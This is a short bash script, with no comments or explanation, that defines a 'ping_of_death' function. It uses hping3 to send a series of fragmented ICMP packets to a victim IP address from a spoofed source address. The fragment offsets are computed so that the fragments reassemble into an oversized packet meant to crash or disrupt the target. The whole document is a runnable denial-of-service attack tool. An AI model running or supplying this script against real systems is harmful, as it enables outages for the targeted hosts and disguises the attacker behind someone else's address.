#!/bin/bash

function ping_of_death ()
{
    local victim_ip=$1
    local source_ip=$2
    local id=186
    local data_size=1450
    let icmp_size=${data_size}+8
    hping3 --icmp ${victim_ip} -a ${source_ip} --data ${data_size} --id ${id} --count 1 --morefrag 

    for i in $(seq 50)
    do
        let offset=${i}*${icmp_size}
        hping3 --icmp ${victim_ip} -a ${source_ip} --data ${data_size} --id ${id} --count 1 --morefrag --fragoff $offset
    done
}

ping_of_death $*
